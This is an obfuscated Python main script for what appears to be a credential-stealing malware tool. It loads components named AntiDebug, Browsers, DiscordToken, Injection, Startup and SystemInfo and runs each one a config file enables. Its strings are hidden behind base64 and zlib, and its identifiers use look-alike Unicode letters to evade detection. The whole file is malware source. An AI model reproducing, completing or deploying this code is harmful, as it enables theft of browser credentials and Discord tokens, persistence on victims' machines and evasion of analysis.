import logging
import click
from rich.logging import RichHandler
from components.antidebug import AntiDebug
from components.browsers import Browsers
from components.discordtoken import DiscordToken
from components.injection import Injection
from components.startup import Startup
from components.systeminfo import SystemInfo
from config import __CONFIG__

def main():
    𝘭𝗼𝘨𝗴𝙞𝙣𝗴.basicConfig(level=__𝗶𝙢𝙥𝗼𝗿𝙩__('base64').b64decode(__𝙞𝗺𝘱𝙤𝙧𝘵__('zlib').decompress(b'x\xda\x0b\xc9\xb6\x0c\r5\x08\x0b\x05\x00\x0by\x02~')).decode(), format=__𝗶𝙢𝘱𝘰𝘳𝙩__('base64').b64decode(__𝗶𝗺𝘱𝙤𝘳𝘵__('zlib').decompress(b'x\xda\xf3\n\xce(\x89\x8a\xf0\xab\x8a\x0cO\xc9\xf1\x8e\xf0\xb5\x05\x001\x1f\x05\xa1')).decode(), datefmt=__𝘪𝘮𝘱𝙤𝙧𝙩__('base64').b64decode(__𝗶𝗺𝗽𝘰𝙧𝘁__('zlib').decompress(b'x\xda\x0b\xaf\x0c\x8b\x8c\x08\xb4\xb5\x05\x00\x0c\xda\x02\xa3')).decode(), handlers=[𝙍𝘪𝗰𝗵𝘏𝙖𝗻𝙙𝙡𝘦𝙧(rich_tracebacks=True, tracebacks_suppress=[𝗰𝘭𝗶𝘤𝗸])])
    𝘭𝗼𝙜𝘨𝙞𝘯𝗴.getLogger(__𝗶𝙢𝙥𝗼𝗿𝙩__('base64').b64decode(__𝗶𝗺𝘱𝗼𝙧𝙩__('zlib').decompress(b'x\xdaK\xce\xcd\xc9Jt\xb4\xb5\x05\x00\r\xb3\x02\xc3')).decode())
    𝙛𝘂𝘯𝗰𝘀 = [𝘼𝗻𝘁𝘪𝗗𝗲𝙗𝘶𝙜, 𝘽𝗿𝙤𝙬𝘴𝙚𝙧𝘀, 𝗗𝙞𝘴𝗰𝙤𝗿𝙙𝙏𝘰𝘬𝘦𝙣, 𝘐𝙣𝙟𝘦𝙘𝘵𝙞𝙤𝗻, 𝗦𝙩𝘢𝙧𝘵𝙪𝘱, 𝘚𝘺𝘴𝘁𝗲𝙢𝙄𝗻𝗳𝗼]
    for 𝘧𝘂𝘯𝙘 in 𝙛𝘂𝘯𝙘𝘀:
        if __𝗖𝙊𝗡𝙁𝙄𝘎__[𝙛𝘶𝗻𝙘.__name__.lower()]:
            try:
                if 𝙛𝘂𝙣𝘤.__init__.__code__.co_argcount == 𝙞𝗻𝘵.from_bytes(𝗺𝘢𝘱(lambda O, i: 571 - (𝗶𝘯𝙩(𝙊) + 𝗶), 𝙢𝙖𝙥(__𝙞𝘮𝙥𝙤𝗿𝘵__('base64').b64decode(__𝗶𝘮𝗽𝙤𝘳𝙩__('zlib').decompress(b'x\xda\x03\x00\x00\x00\x00\x01')).decode().join, 𝘻𝘪𝘱(*[𝙞𝙩𝗲𝗿(__𝙞𝗺𝘱𝙤𝗿𝘁__('base64').b64decode(__𝙞𝙢𝘱𝙤𝘳𝘁__('zlib').decompress(b'x\xda\xf3\x0b\x894\x05\x00\x03\x1f\x011')).decode())] * 3)), 𝗿𝙖𝗻𝗴𝗲(1)), __𝙞𝙢𝙥𝙤𝘳𝘵__('base64').b64decode(__𝙞𝘮𝙥𝘰𝘳𝘁__('zlib').decompress(b'x\xdaKr\xcf1Hq\xaf\xc8\x01\x00\x0cB\x02\xd5')).decode(), signed=False):
                    𝙛𝘂𝘯𝘤(__𝗖𝗢𝗡𝘍𝘐𝘎__[__𝗶𝘮𝙥𝙤𝗿𝘁__('base64').b64decode(__𝘪𝗺𝘱𝘰𝘳𝘁__('zlib').decompress(b'x\xdaK1\n\xcbLt\xb7,K,\xb7\xb5\x05\x00\x1a,\x03\xff')).decode()])
                else:
                    𝙛𝙪𝗻𝙘()
            except 𝗘𝘹𝘤𝙚𝘱𝙩𝘪𝘰𝘯 as e:
                𝙥𝘳𝘪𝙣𝘵(__𝗶𝘮𝘱𝗼𝗿𝙩__('base64').b64decode(__𝗶𝙢𝗽𝗼𝘳𝘵__('zlib').decompress(b'x\xda\x0b\x8a\xf0\xaaL2\xf6LO\x0c7IO560\xf3\xf4(\xb1\x04\x00D_\x06B')).decode().format(𝘧𝘂𝗻𝙘.__name__, 𝙚))
if __𝙣𝘢𝙢𝙚__ == __𝘪𝘮𝘱𝘰𝘳𝘵__('base64').b64decode(__𝗶𝘮𝙥𝗼𝗿𝘵__('zlib').decompress(b'x\xda\x8b0\xb4,\x89\x0c\xcf)\x8d0\xb4\xb0\x05\x00\x19/\x03\xc6')).decode():
    𝘮𝘢𝙞𝙣()